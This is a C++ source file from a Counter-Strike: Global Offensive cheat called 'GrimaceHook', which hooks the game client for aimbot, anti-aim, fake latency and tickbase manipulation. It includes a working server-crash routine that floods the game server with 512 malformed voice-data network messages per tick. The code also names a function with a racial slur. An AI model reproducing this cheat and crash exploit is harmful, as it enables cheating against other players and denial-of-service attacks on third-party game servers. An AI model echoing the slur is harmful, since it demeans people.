#include "includes.h"

Client g_ctx{ };

// loader will set this fucker.
char username[ 33 ] = "\x90\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90";
#define FRAMERATE_AVG_FRAC 0.9

// init routine.
ulong_t __stdcall Client::init( void* arg )
{
	// if not in interwebz mode, the driver will not set the username.
	g_ctx.m_user = XOR( "GrimaceHook" );

	//AllocConsole();
	//freopen_s( (FILE**)stdout, "CONOUT$", "w", stdout );
	//freopen_s( (FILE**)stderr, "CONOUT$", "w", stderr );
	//freopen_s( (FILE**)stdin, "CONIN$", "r", stdin );
	//SetConsoleTitleA( "Bro test Debug" );

	//int Bro = MessageBox( NULL, XOR( "are desync files present????? sir This is Crucial" ), XOR( "" ), MB_YESNO | MB_ICONQUESTION );
	//
	//if ( Bro == 6 )
	//	g_skins.m_desync = true;

	// stop here if we failed to acquire all the data needed from csgo.
	if ( !g_csgo.init() )
		return 0;

	g_ctx.UnlockHiddenConvars();
	printf_s( "unlock cvars" );

	// welcome the user.
	g_notify.add( tfm::format( XOR( "welcome to %s\n" ), g_ctx.m_user ) );

	return 1;
}

void Client::BuyBot() {
	if (!g_ctx.m_local)
		return;

	if ( g_Variables.m_bools[ "buybot_ignorepistol" ] )
	{
		if ( g_csgo.m_gamerules->m_totalRoundsPlayed() == 0 || g_csgo.m_gamerules->m_totalRoundsPlayed() == g_csgo.mp_maxrounds->GetInt() / 2 )
			return;
	}

	int team = g_ctx.m_local->m_iTeamNum();

	switch (g_Variables.m_ints["buybot_primary"]) {
	case 1:
		g_csgo.m_engine->ExecuteClientCmd("buy awp"); break;
	case 2:
		if (team == TEAM_COUNTERTERRORISTS)
			g_csgo.m_engine->ExecuteClientCmd("buy scar20");
		else if (team == TEAM_TERRORISTS)
			g_csgo.m_engine->ExecuteClientCmd("buy g3sg1");

		break;
	case 3:
		g_csgo.m_engine->ExecuteClientCmd("buy ssg08"); break;
	default:
		break;
	}

	switch (g_Variables.m_ints["buybot_secondary"]) {
	case 1:
		g_csgo.m_engine->ExecuteClientCmd("buy deagle"); break;
	default:
		break;
	}

	if (g_Variables.m_bools["buybot_armor"]) {
		g_csgo.m_engine->ExecuteClientCmd("buy vest");
		g_csgo.m_engine->ExecuteClientCmd("buy vesthelm");
	}

	if (g_Variables.m_bools["buybot_grenades"]) {
		g_csgo.m_engine->ExecuteClientCmd("buy molotov");
		g_csgo.m_engine->ExecuteClientCmd("buy incgrenade");
		g_csgo.m_engine->ExecuteClientCmd("buy hegrenade");
		g_csgo.m_engine->ExecuteClientCmd("buy smokegrenade");
	}

	if (g_Variables.m_bools["buybot_taser"]) {
		g_csgo.m_engine->ExecuteClientCmd("buy taser");
	}

	g_csgo.m_engine->ExecuteClientCmd("buy defuser"); // whatever
}

void Client::DrawHUD()
{
	if ( !g_Variables.m_bools["watermark"])
		return;

	// get round trip time in milliseconds.
	int ms = std::max( 0, (int)std::round( g_ctx.m_latency * 1000.f ) );
	static int buffer_fps = 0;
	static float buffer_fps_time;

	if ( buffer_fps_time < g_csgo.m_globals->m_realtime && m_local )
	{
		buffer_fps = int(1.f / g_ctx.m_framerate);
		buffer_fps_time = g_csgo.m_globals->m_realtime + 2.f;
	}

	std::string text = tfm::format( XOR( "grimace | rtt: %ims | fps: %i" ), ms, buffer_fps );
	auto sz = render::hud.size( text );
	watermark_textsize = { sz.m_width, sz.m_height };

	// background.
	render::rect_filled( m_width - watermark_textsize.first - 20, 10, watermark_textsize.first + 10, watermark_textsize.second + 2, { 80, 50, 75, 225 } );

	// text.
	render::hud.string( m_width - 15, 10, { 255, 255, 255, 250 }, text, render::ALIGN_RIGHT );
}

void Client::UnlockHiddenConvars()
{
	if ( !g_csgo.m_cvar )
		return;

	auto p = **reinterpret_cast<ConVar***>( g_csgo.m_cvar + 0x34 );
	for ( auto c = p->m_next; c != nullptr; c = c->m_next )
	{
		c->m_flags &= ~FCVAR_DEVELOPMENTONLY;
		c->m_flags &= ~FCVAR_HIDDEN;
	}
}

void Client::ClanTag()
{
	auto SetClanTag = [&]( std::string tag ) -> void
		{
			using SetClanTag_t = int( __fastcall* )( const char*, const char* );
			static auto SetClanTagFn = pattern::find( g_csgo.m_engine_dll, XOR( "53 56 57 8B DA 8B F9 FF 15" ) ).as<SetClanTag_t>();
			SetClanTagFn( tag.c_str(), XOR( "grimacehook" ) );
		};

	static int iPrevFrame = 0;
	static bool bReset = false;

	if ( g_Variables.m_bools[ "clantag_spammer" ] )
	{
		int cycle = int( g_csgo.m_globals->m_curtime * 3.5f ) % 19;

		if ( cycle != iPrevFrame )
		{
			switch ( cycle )
			{
			case 0: { SetClanTag( "grimacehook" ); break; }
			case 1: { SetClanTag( "gr1m@ceh00k" ); break; }
			case 2: { SetClanTag( "grimace" ); break; }
			case 3: { SetClanTag( "GRIMACE" ); break; }
			case 4: { SetClanTag( "GR1M@C3" ); break; }
			case 5: { SetClanTag( "GR1M@C3hook" ); break; }
			case 6: { SetClanTag( "GR1M@C3h00k" ); break; }
			case 7: { SetClanTag( "grimaceH00K" ); break; }
			case 8: { SetClanTag( "grimaceH00" ); break; }
			case 9: { SetClanTag( "gr1m@c3Ho" ); break; }
			case 10: { SetClanTag( "GRiMaCeh" ); break; }
			case 11: { SetClanTag( "GR1M@C3" ); break; }
			case 12: { SetClanTag( "gr1m@c" ); break; }
			case 13: { SetClanTag( "grima" ); break; }
			case 14: { SetClanTag( "GR1M" ); break; }
			case 15: { SetClanTag( "GR1" ); break; }
			case 16: { SetClanTag( "gr" ); break; }
			case 17: { SetClanTag( "G" ); break; }
			case 18: { SetClanTag( "" ); break; }
			}
		}

		iPrevFrame = cycle;

		// do we want to reset after untoggling the clantag?
		bReset = true;
	}
	else
	{
		// reset our clantag.
		if ( bReset )
		{
			SetClanTag( XOR( "" ) );
			bReset = false;
		}
	}
}

void Client::Skybox()
{
	static ConVar* sv_skyname = g_csgo.m_cvar->FindVar( HASH( "sv_skyname" ) );
	if ( !g_Variables.m_bools[ "skybox_changer" ] )
	{
		game::LoadNamedSky( sv_skyname->m_value.m_string );
		return;
	}

	switch ( g_Variables.m_ints[ "skybox_change_name" ] )
	{
	case 0: //Tibet
		game::LoadNamedSky( XOR( "cs_tibet" ) );
		break;
	case 1: //Embassy
		game::LoadNamedSky( XOR( "embassy" ) );
		break;
	case 2: //Italy
		game::LoadNamedSky( XOR( "italy" ) );
		break;
	case 3: //Daylight 1
		game::LoadNamedSky( XOR( "sky_cs15_daylight01_hdr" ) );
		break;
	case 4: //Cloudy
		game::LoadNamedSky( XOR( "sky_csgo_cloudy01" ) );
		break;
	case 5: //Night 1
		game::LoadNamedSky( XOR( "sky_csgo_night02" ) );
		break;
	case 6: //Night 2
		game::LoadNamedSky( XOR( "sky_csgo_night02b" ) );
		break;
	case 7: //Night Flat
		game::LoadNamedSky( XOR( "sky_csgo_night_flat" ) );
		break;
	case 8: //Day HD
		game::LoadNamedSky( XOR( "sky_day02_05_hdr" ) );
		break;
	case 9: //Day
		game::LoadNamedSky( XOR( "sky_day02_05" ) );
		break;
	case 10: //Rural
		game::LoadNamedSky( XOR( "sky_l4d_rural02_ldr" ) );
		break;
	case 11: //Vertigo HD
		game::LoadNamedSky( XOR( "vertigo_hdr" ) );
		break;
	case 12: //Vertigo Blue HD
		game::LoadNamedSky( XOR( "vertigoblue_hdr" ) );
		break;
	case 13: //Vertigo
		game::LoadNamedSky( XOR( "vertigo" ) );
		break;
	case 14: //Vietnam
		game::LoadNamedSky( XOR( "vietnam" ) );
		break;
	case 15: //Dusty Sky
		game::LoadNamedSky( XOR( "sky_dust" ) );
		break;
	case 16: //Jungle
		game::LoadNamedSky( XOR( "jungle" ) );
		break;
	case 17: //Nuke
		game::LoadNamedSky( XOR( "nukeblank" ) );
		break;
	case 18: //Office
		game::LoadNamedSky( XOR( "office" ) );
		break;
	case 19:
		game::LoadNamedSky(XOR(g_Variables.m_strings["skybox_custom"].c_str()));
		break;
	default:
		break;
	}
}

void Client::KillFeed()
{
	if ( !g_Variables.m_bools["preserve_killfeed"])
		return;

	if ( !g_csgo.m_engine->IsInGame() )
		return;

	// get the addr of the killfeed.
	KillFeed_t* feed = (KillFeed_t*)g_csgo.m_hud->FindElement( HASH( "SFHudDeathNoticeAndBotStatus" ) );
	if ( !feed )
		return;

	int size = feed->notices.Count();
	if ( !size )
		return;

	for ( int i{ }; i < size; ++i )
	{
		NoticeText_t* notice = &feed->notices[ i ];

		// this is a local player kill, delay it.
		if ( notice->fade == 1.5f )
			notice->fade = FLT_MAX;
	}
}

void nigger()
{
	if ( !g_ctx.m_processing )
		return;

	const auto& pos = g_ctx.m_local->GetRenderOrigin();
	vec2_t tmp;

	render::menu_shade.string( ( g_ctx.m_height / 2 ) - 15, g_ctx.m_width / 2, colors::white, std::to_string( int( abs( g_ctx.m_abs_yaw - g_server_animations.m_fake_feet_yaw ) ) ) );

	if ( render::WorldToScreen( pos, tmp ) )
	{
		vec2_t draw_tmp;

		const vec3_t fake_pos( 50.f * cos( math::deg_to_rad( g_ctx.m_abs_yaw ) ) + pos.x, 50.f * sin( math::deg_to_rad( g_ctx.m_abs_yaw ) ) + pos.y, pos.z );

		if ( render::WorldToScreen( fake_pos, draw_tmp ) )
		{
			render::line( tmp.x, tmp.y, draw_tmp.x, draw_tmp.y, { 255, 0, 0, 255 } );
			render::menu_shade.string( draw_tmp.x, draw_tmp.y, { 255, 0, 0, 255 }, "real abs", render::ALIGN_LEFT );
		}

		float lby = g_server_animations.m_fake_feet_yaw;
		const vec3_t lby_pos( 50.f * cos( math::deg_to_rad( lby ) ) + pos.x,
			50.f * sin( math::deg_to_rad( lby ) ) + pos.y, pos.z );

		if ( render::WorldToScreen( lby_pos, draw_tmp ) )
		{
			render::line( tmp.x, tmp.y, draw_tmp.x, draw_tmp.y, { 255, 255, 255, 255 } );
			render::menu_shade.string( draw_tmp.x, draw_tmp.y, { 255, 255, 255, 255 }, "enemy abs", render::ALIGN_LEFT );
		}
	}
}

void Client::OnPaint()
{
	// update screen size.
	g_csgo.m_engine->GetScreenSize( m_width, m_height );

	g_input.m_should_listen = !g_csgo.m_client->IsChatRaised() && !g_csgo.m_engine->Con_IsVisible();

	// render stuff.
	g_visuals.think();
	g_grenades.paint();
	g_notify.think();

	//nigger();

	DrawHUD();

	KillFeed();
}

void Client::OnMapload()
{
	// store class ids.
	g_netvars.SetupClassData();

	// createmove will not have been invoked yet.
	// but at this stage entites have been created.
	// so now we can retrive the pointer to the local player.
	m_local = g_csgo.m_entlist->GetClientEntity< Player* >( g_csgo.m_engine->GetLocalPlayer() );

	// FIX THIS SHIT LOL.
	// 
	//callbacks::SetPostProcess();
	// i can add stuff for dis ting dw
	// 
	// world materials.
	g_ctx.m_change_world = true;

	g_visuals.ModulateWorld();

	// init knife shit.
	g_skins.load();

	m_sequences.clear();

	g_csgo.m_engine->ExecuteClientCmd(g_Variables.m_strings["autoexec"].c_str());

	for (int i = 1; i <= g_csgo.m_entlist->GetHighestEntityIndex(); i++) {
		Entity* ent = g_csgo.m_entlist->GetClientEntity(i);
		if (!ent)
			continue;

		if ( ent->GetClientClass()->m_ClassID == 36 )
			if ( reinterpret_cast<CPlayerResource*>( ent ) != player_resource )
				player_resource = reinterpret_cast<CPlayerResource*>( ent );
	}
	
	// handle maxunlags
	{
		static std::vector<std::pair<const char*, float>> servers;
		servers.push_back( { "185.29.166.133:27015", 0.4f } ); // nexus
		servers.push_back( { "74.91.113.127:27015", 0.5f } ); // gametime
		servers.push_back( { "74.91.113.151:27015", 0.5f } ); // gametime
		servers.push_back( { "45.45.237.162:27015", 0.5f } ); // dick's

		const char* sv = g_csgo.m_cl->m_net_channel->GetAddress();
		for ( auto& curr : servers )
		{
			if ( strcmp( sv, curr.first ) == 0 ) // we've found a server, strcmp returns 1 if its not what we want for whatever reason
			{
				g_csgo.sv_maxunlag->SetValue( curr.second );
				g_notify.add(tfm::format("max ping spike is %.fms\n", curr.second * 1000));
				break;
			}
		}

		servers.clear();
	}

	// allocate bone matrixes
	{
		CREATE_IF_NULL( g_chams.local_hidden, (BoneArray*)g_csgo.m_mem_alloc->Alloc( sizeof( BoneArray ) * 128 ) );
		CREATE_IF_NULL( g_server_animations.local_matrix, (BoneArray*)g_csgo.m_mem_alloc->Alloc( sizeof( BoneArray ) * 128 ) );
		CREATE_IF_NULL( g_server_animations.local_render_matrix, (BoneArray*)g_csgo.m_mem_alloc->Alloc( sizeof( BoneArray ) * 128 ) );	
	}

	// if the INetChannelInfo pointer has changed, store it for later.
	g_csgo.m_net = g_csgo.m_engine->GetNetChannelInfo();

	if ( g_csgo.m_net )
	{
		g_hooks.m_net_channel.reset();
		g_hooks.m_net_channel.init( g_csgo.m_net );
		g_hooks.m_net_channel.add( INetChannel::PROCESSPACKET, util::force_cast( &Hooks::ProcessPacket ) );
		g_hooks.m_net_channel.add( INetChannel::SENDDATAGRAM, util::force_cast( &Hooks::SendDatagram ) );
		g_hooks.m_net_channel.add( INetChannel::SENDNETMSG, util::force_cast( &Hooks::SendNetMsg ) );
	}
}

void Client::HandleFakeLatency() {
	if (g_csgo.m_globals->m_tick_count % 2 != 0)
		return;

	if (g_Variables.get_keystate(g_Variables.m_binds["fakelatency_spike"])) {
		if (m_fakelatency_amt > g_Variables.m_floats["fakelatency_spike"]) {
			m_fakelatency_amt = g_Variables.m_floats["fakelatency_spike"];
			m_fakelatency_amt = std::clamp(m_fakelatency_amt, 0.f, g_csgo.sv_maxunlag->GetFloat() * 1000.f);
			return;
		}

		if (m_fakelatency_amt < std::min( g_csgo.sv_maxunlag->GetFloat() * 1000.f, g_Variables.m_floats["fakelatency_spike"] ) )
			m_fakelatency_amt += 20.f;
	}
	else
		m_fakelatency_amt = g_Variables.m_floats["fakelatency_default"];
}

void Client::StartMove( CUserCmd* cmd )
{
	m_cmd = cmd;
	m_tick = cmd->m_tick;
	m_view_angles = cmd->m_view_angles;
	m_buttons = cmd->m_buttons;
	m_pressing_move = ( m_buttons & ( IN_LEFT ) || m_buttons & ( IN_FORWARD ) || m_buttons & ( IN_BACK ) ||
		m_buttons & ( IN_RIGHT ) || m_buttons & ( IN_MOVELEFT ) || m_buttons & ( IN_MOVERIGHT ) ||
		m_buttons & ( IN_JUMP ) );

	m_local = g_csgo.m_entlist->GetClientEntity< Player* >( g_csgo.m_engine->GetLocalPlayer() );
	if ( !m_local )
		return;

	m_hide_angle = 0;

	m_max_lag = g_csgo.sv_maxusrcmdprocessticks->GetInt() - g_tickbase.m_extra_process_ticks - 1;

	m_lag = g_csgo.m_cl->m_choked_commands;
	m_lerp = game::GetClientInterpAmount();
	m_latency = g_csgo.m_net->GetLatency( INetChannel::FLOW_OUTGOING );

	m_tickrate = int( 1.f / g_csgo.m_globals->m_interval );
	m_framerate = FRAMERATE_AVG_FRAC * m_framerate + ( 1.f - FRAMERATE_AVG_FRAC ) * g_csgo.m_globals->m_abs_frametime;
	if ( m_framerate <= 0.0f )
		m_framerate = 1.0f;

	m_landed_on_anim_update = false;

	// lelelele bro
	//waif (g_Variables.m_ints["buybot_primary"] == 1)
	//wa	BuyAwpBeforeKamiDoes(cmd->m_tick);

	HandleFakeLatency();
	HandleKillsays();

	g_inputpred.update();
	
	m_processing = m_local && m_local->alive() && m_local->m_iHealth() > 0;
	if ( !m_processing )
	{
		m_usable_swap_command = -1;
		return;
	}

	QuickSwitch( cmd );

	g_inputpred.GetDatamap( g_inputpred.cm_start );

	m_flags = m_local->m_fFlags();
	m_shot = false;
}

void Client::BackupPlayers( bool restore )
{ // we want to check localplayer here in order to SuperSetupBones.
	if ( restore )
	{
		// restore stuff.
		for ( int i{ 1 }; i <= g_csgo.m_globals->m_max_clients; ++i )
		{
			Player* player = g_csgo.m_entlist->GetClientEntity< Player* >( i );

			if ( !g_aimbot.IsValidTarget( player, false ) )
				continue;

			g_aimbot.m_backup[ i - 1 ].restore( player );
		}
	}

	else
	{
		// backup stuff.
		for ( int i{ 1 }; i <= g_csgo.m_globals->m_max_clients; ++i )
		{
			Player* player = g_csgo.m_entlist->GetClientEntity< Player* >( i );

			if ( !g_aimbot.IsValidTarget( player, false ) )
				continue;

			g_aimbot.m_backup[ i - 1 ].store( player );
		}
	}
}

void Client::DoMove()
{
	m_pen_crosshair_bullshit_shit_feature = 0;

	// backup strafe angles (we need them for input prediction)
	m_strafe_angles = m_cmd->m_view_angles;

	// run movement code before input prediction.
	g_movement.JumpRelated();
	g_movement.AutoStrafe();
	g_movement.AutoPeek();
	g_movement.FakeWalk();

	// do our transition flick for anti-aim.
	g_movement.m_transition_flick = false;
	if ( g_Variables.m_bools[ "antiaim_transition_flick" ] && !g_Variables.get_keystate( g_Variables.m_binds[ "fakewalk" ] ) && g_hvh.m_manual_direction == ManualAAMode::NONE)
	{
		if ( g_ctx.m_pressing_move && g_movement.m_transition_reset )
		{
			m_cmd->m_forward_move = m_cmd->m_side_move = 0.0f;
			g_movement.m_transition_flick = true;

			if ( !g_movement.m_transition_stage.first )
			{
				g_ctx.m_cmd->m_forward_move = m_cmd->m_tick % 2 == 0 ? -10.f : 10.f;
			}
		}
		else
		{
			g_movement.m_transition_stage.first = false;
			g_movement.m_transition_stage.second = false;
		}
	}

	// store our prediction data.
	g_inputpred.store();
	// predict 1 tick ahead.
	g_inputpred.predict();

	g_inputpred.GetDatamap( g_inputpred.og_predicted );

	if ( g_Variables.get_keystate( g_Variables.m_binds[ "edge_jump" ] ) )
	{
		g_movement.EdgeJump();
	}

	// cmd gonnanananan get animmatenated.
	if ( !m_lag && g_csgo.m_cl->m_delta_tick > -1 )
	{
		m_pred_aim_matrix_width_range = g_server_animations.GetPredFeetRange();
	}

	// restore original angles after input prediction
	m_cmd->m_view_angles = m_view_angles;

	// convert viewangles to directional forward vector.
	math::AngleVectors( m_view_angles, &m_forward_dir );

	// store stuff after input pred.
	m_shoot_pos = m_local->GetShootPosition();

	// reset shit.
	m_weapon = nullptr;
	m_weapon_info = nullptr;
	m_weapon_id = -1;
	m_weapon_type = WEAPONTYPE_UNKNOWN;
	m_weapon_fire = false;

	// store weapon stuff.
	m_weapon = m_local->GetActiveWeapon();

	if ( m_weapon )
	{
		m_weapon_info = m_weapon->GetWpnData();
		m_weapon_id = m_weapon->m_iItemDefinitionIndex();
		m_weapon_type = m_weapon_info->m_weapon_type;

		// ensure weapon spread values / etc are up to date.
		if ( m_weapon_type != WEAPONTYPE_GRENADE )
			m_weapon->UpdateAccuracyPenalty();

		// run autowall once for penetration crosshair if we have an appropriate weapon.
		if ( !m_forward_dir.is_zero() 
			&& m_weapon_type != WEAPONTYPE_KNIFE 
			&& m_weapon_type != WEAPONTYPE_C4 
			&& m_weapon_type != WEAPONTYPE_GRENADE )
		{
			int hits_remaining = 4;
		
			if ( g_autowall.FireBullet( g_ctx.m_local, g_ctx.m_shoot_pos, m_forward_dir.normalized(), hits_remaining) )
			{
				m_pen_crosshair_bullshit_shit_feature = 3;
			}
			else if ( hits_remaining != 4 )
			{
				m_pen_crosshair_bullshit_shit_feature = 2;
			}
			else
			{
				m_pen_crosshair_bullshit_shit_feature = 1;
			}
		}

		AutoRevolver();
		m_weapon_fire = CanFireWeapon();
	}

	// last tick defuse.
	// todo - dex;  figure out the range for CPlantedC4::Use?
	//              add indicator if valid (on ground, still have time, not being defused already, etc).
	//              move this? not sure where we should put it.
	if ( g_Variables.get_keystate( g_Variables.m_binds[ "last_tick_defuse" ] ) && g_visuals.m_c4_planted )
	{
		float defuse = ( m_local->m_bHasDefuser() ) ? 5.f : 10.f;
		float remaining = g_visuals.m_planted_c4_explode_time - g_csgo.m_globals->m_curtime;
		float dt = remaining - defuse - ( g_ctx.m_latency / 2.f );

		m_cmd->m_buttons &= ~IN_USE;
		if ( dt <= game::TICKS_TO_TIME( 2 ) )
			m_cmd->m_buttons |= IN_USE;
	}

	g_tickbase.UpdateTicks();

	// i dont really think doing this before we repredict for autostop is going to make a difference
	// we aint autostopin with nades lol.
	g_grenades.think();

	g_resolver.process_override();

	if ( !g_tickbase.m_shifting )
	{
		// we want to push from SendPacket too.
		g_aimbot.m_debug_overlay.clear();

		g_hvh.SendPacket();
		g_aimbot.think();
	}

	if ( ( g_ctx.m_cmd->m_buttons & IN_ATTACK ) || ( g_ctx.m_weapon_id == REVOLVER && g_ctx.m_cmd->m_buttons & IN_ATTACK2 ) )
	{
		g_movement.m_autopeek_retreat = true;
		m_usable_swap_command = m_cmd->m_command_number;
	}

	g_hvh.AntiAim();
}

void Client::SmoothAnimations()
{
	if ( !g_ctx.m_smooth_data.m_do_smoothing || !g_ctx.m_processing )
		return;

	auto& s = g_ctx.m_smooth_data;

	float lerptime = g_csgo.m_globals->m_frametime / ( s.m_time - s.m_old_time );

	for ( int i = 0; i < 24; i++ )
	{
		bool bad_cycle = s.m_goal_poses[ i ] > 0.8f || s.m_goal_poses[ i ] < 0.3f && (i == PLAYER_POSE_PARAM_BODY_PITCH || i == PLAYER_POSE_PARAM_STRAFE_DIR); // this will make a bad step between animations and cause weird jittering

		if ( bad_cycle )
			continue;

		s.m_old_poses[ i ] = math::Lerp( lerptime, s.m_old_poses[ i ], s.m_goal_poses[ i ] );
	}

	for ( int i = 0; i < 13; i++ )
	{
		s.m_old_layers[ i ].m_anim_time = math::Lerp( lerptime, s.m_old_layers[ i ].m_anim_time, s.m_goal_layers[ i ].m_anim_time );
		s.m_old_layers[ i ].m_fade_out_time = math::Lerp( lerptime, s.m_old_layers[ i ].m_fade_out_time, s.m_goal_layers[ i ].m_fade_out_time );
		s.m_old_layers[ i ].m_prev_cycle = math::Lerp( lerptime, s.m_old_layers[ i ].m_prev_cycle, s.m_goal_layers[ i ].m_prev_cycle );
		//s.m_old_layers[ i ].m_weight = math::Lerp( lerptime, s.m_old_layers[ i ].m_weight, s.m_goal_layers[ i ].m_weight );
		//s.m_old_layers[ i ].m_weight_delta_rate = math::Lerp( lerptime, s.m_old_layers[ i ].m_weight_delta_rate, s.m_goal_layers[ i ].m_weight_delta_rate );
		//s.m_old_layers[ i ].m_playback_rate = math::Lerp( lerptime, s.m_old_layers[ i ].m_playback_rate, s.m_goal_layers[ i ].m_playback_rate);
		s.m_old_layers[ i ].m_cycle = math::Lerp( lerptime, s.m_old_layers[ i ].m_cycle, s.m_goal_layers[ i ].m_cycle );
	}

	s.m_old_abs += math::NormalizedAngle( s.m_goal_abs - s.m_old_abs ) * lerptime;

	g_ctx.m_local->SetPoseParameters( s.m_old_poses );
	g_ctx.m_local->SetAnimLayers( s.m_old_layers );

	g_ctx.m_local->SetAbsAngles( ang_t( 0.f, s.m_old_abs, 0.f ) );

	g_bones.Bro( g_ctx.m_local, BONE_USED_BY_ANYTHING, g_server_animations.local_render_matrix );
	g_server_animations.last_render_setup = g_ctx.m_local->GetAbsOrigin();

	g_ctx.m_local->SetPoseParameters( s.m_goal_poses );
	g_ctx.m_local->SetAnimLayers( s.m_goal_layers );
}

void Client::UpdateJumping() {
	// turns out we shouldn't use predicted...
	if ( ( m_flags & FL_ONGROUND ) && ( g_ctx.m_cmd->m_buttons & IN_JUMP ) ) {
		m_jumping_to_push = true;
	}
}

void Client::UpdateAnimRecord( CUserCmd* cmd )
{
	auto PushUpdate = [&]() -> void
		{
			int last_update = g_ctx.m_update_records.size() ? g_ctx.m_update_records.front().m_cmd_num : 0;
			bool force_smoothing = g_hvh.m_twist_lag > 0 || cmd->m_weapon_select != 0 || cmd->m_command_number - last_update < 5; // less than 5 tick fakelag.. why not just interp always

			g_ctx.m_update_records.push_front( {
				cmd->m_command_number,
				m_hide_angle,
				g_server_animations.m_viewmodel_act,
				m_jumping_to_push,
				force_smoothing
				} );

			g_server_animations.m_viewmodel_act = 0;
			m_jumping_to_push = false;
		};

	if ( m_last_spawn_time != m_local->m_flSpawnTime() )
	{
		m_update_records.clear();

		CCSGOPlayerAnimState* state = m_local->m_PlayerAnimState();
		if ( state )
		{
			game::ResetAnimationState( state );
			for ( int i = 0; i < 24; i++ )
			{
				if ( i < 13 )
				{
					g_ctx.m_local->m_AnimOverlay()[ i ].m_weight = 0.f;
				}

				g_ctx.m_local->m_flPoseParameter()[ i ] = 0.f;
			}

			m_jumping_to_push = false;
			PushUpdate();
		}

		m_last_spawn_time = m_local->m_flSpawnTime();
		return;
	}

	UpdateJumping();

	if ( !g_ctx.m_lag )
	{
		if ( g_hvh.m_mode == WALK )
			g_hvh.m_lastmove_yaw = cmd->m_view_angles.y;

		if ( !m_hide_angle )
			g_hvh.m_real_angles = cmd->m_view_angles;

		PushUpdate();
	}

	if ( !m_update_records.empty() )
	{
		while ( m_update_records.back().m_cmd_num < g_csgo.m_cl->m_last_command_ack )
			m_update_records.pop_back();
	}
}

void Client::EndMove( CUserCmd* cmd )
{
	UpdateAnimRecord( cmd );

	// we shouldnt need to do pitch clamp
	// since we never set it outside 89 degree range
	// we aint playin with VAC anyways.
	math::NormalizeAngle( cmd->m_view_angles.y );

	// fix our movement.
	g_movement.FixMove( cmd, m_strafe_angles );
	g_movement.MoonWalk( cmd );

	// this packet will be sent.
	if ( *m_packet )
	{
		// we are sending a packet, so this will be reset soon.
		// store the old value.
		m_old_lag = m_lag;

		// get current origin.
		vec3_t cur = m_local->m_vecOrigin();

		// get prevoius origin.
		vec3_t prev = m_net_pos.empty() ? cur : m_net_pos.front().m_pos;

		// check if we broke lagcomp.
		m_lagcomp = ( cur - prev ).length_sqr() > 4096.f;

		// save sent origin and time.
		m_net_pos.emplace_front( g_csgo.m_globals->m_curtime, cur );

		m_sent_angles = cmd->m_view_angles;

		if ( g_ctx.m_local->m_fFlags() & FL_ONGROUND && g_ctx.m_cmd->m_buttons & IN_JUMP )
			m_landed_on_anim_update = true;
	}

	// store some values for next tick.
	m_old_packet = *m_packet;
	m_old_shot = m_shot;
	m_old_buttons = m_cmd->m_buttons;
}

using CCLCMsg_VoiceData_ctor_t = void( __thiscall* )( void* msg );
using CCLCMsg_VoiceData_dtor_t = void( __thiscall* )( void* msg );
using protobuf_assign_t = void( __thiscall* )( void* ptr, void* data, size_t len );

uintptr_t CallableFromRelative( DWORD nAddress )
{
	return nAddress + *(DWORD*)( nAddress + 1 ) + 5;
}

void server_crasher_xddddddd()
{
	static CCLCMsg_VoiceData_ctor_t CCLCMsg_VoiceData_ctor = 
		pattern::find( g_csgo.m_engine_dll, 
			XOR( "56 57 8B F9 8D 4F 08 C7 07 ? ? ? ? E8 ? ? ? ? C7 07" ) ).as<CCLCMsg_VoiceData_ctor_t>();
	static CCLCMsg_VoiceData_dtor_t CCLCMsg_VoiceData_dtor =
		pattern::find( g_csgo.m_engine_dll, XOR( "53 8B D9 56 8D 73 3C" ) ).as< CCLCMsg_VoiceData_dtor_t >();

	static uintptr_t temp =
		pattern::find( g_csgo.m_engine_dll, XOR( "E8 ? ? ? ? 83 ? ? ? ? 83 ? ? ? ? C7 44" ) ).as< uintptr_t >();
	static protobuf_assign_t protobuf_assign = (protobuf_assign_t)CallableFromRelative( temp );

	INetChannel* nc;
	uint8_t      msg[ 104 ];

	nc = g_csgo.m_engine->GetNetChannelInfo();
	if ( !nc )
		return;

	static float flCrashTime = 0.f;

	if ( g_GUI.bruh )
	{
		flCrashTime = g_csgo.m_globals->m_realtime;
		g_GUI.bruh = false;
	}

	if ( flCrashTime <= 0.f )
		return;

	if ( fabsf( flCrashTime - g_csgo.m_globals->m_realtime ) > 10.f )
		return;

	CCLCMsg_VoiceData_ctor( &msg );
	protobuf_assign( &msg[ 8 ], nullptr, 0 );

	for ( int i = 0; i < 512; ++i )
		nc->SendNetMsg( (INetMessage*)&msg );

	nc->Transmit();

	CCLCMsg_VoiceData_dtor( &msg );
}

void Client::OnTick( CUserCmd* cmd )
{
	server_crasher_xddddddd();

	// store some data and update prediction.
	StartMove( cmd );

	// not much more to do here.
	if ( !m_processing )
		return;

	if ( g_tickbase.m_shifting )
	{
		*m_packet = g_tickbase.m_shift_ticks == 1; // only send on the last shifted.
		cmd->m_buttons &= ~( IN_ATTACK | IN_ATTACK2 ); // prevent shooting mid-shift, will also give autofire for pistols when you DT.
		//g_ctx.print("shiftin\n");
	}
	else
	{
		//g_ctx.print("not shiftin\n");
	}

	// save the original state of players.
	BackupPlayers( false );

	// run all movement related code.
	DoMove();

	// store stome additonal stuff for next tick
	// sanetize our usercommand if needed and fix our movement.
	EndMove( cmd );

	// restore the players.
	BackupPlayers( true );

	// restore curtime/frametime
	// and prediction seed/player.
	g_inputpred.restore();
	g_inputpred.SetDatamap( g_inputpred.cm_start );

	// Retard.
	g_tickbase.FinishShift();
}

void Client::UpdateAnimstate( CUserCmd* cmd, ang_t view_angles, int viewmodel_act, bool jumping, bool apply_data )
{
	CCSGOPlayerAnimState* state = g_ctx.m_local->m_PlayerAnimState();
	if ( !state )
		return;

	if ( apply_data )
		g_ctx.m_angle = cmd->m_view_angles;

	g_server_animations.DoPreAnimation( g_server_animations.PredictAnimationState( g_ctx.m_local, view_angles ).first, cmd, viewmodel_act, jumping, apply_data );

	if ( state->m_last_update_frame >= g_csgo.m_globals->m_frame )
		state->m_last_update_frame = g_csgo.m_globals->m_frame - 1;

	C_AnimationLayer maintain_layers[ 13 ];
	g_ctx.m_local->GetAnimLayers( maintain_layers );

	state->update( view_angles );

	g_netdata.MaintainClientLayers( maintain_layers );

	if ( apply_data )
	{
		g_ctx.m_abs_yaw = state->m_abs_yaw;

		// predict without the foot yaw check, like how our enemys will.
		if ( state->m_on_ground )
		{
			if ( state->m_velocity_length_xy > 0.1f )
			{
				g_ctx.m_enemy_body_pred = g_csgo.m_globals->m_curtime + 0.22f;
			}
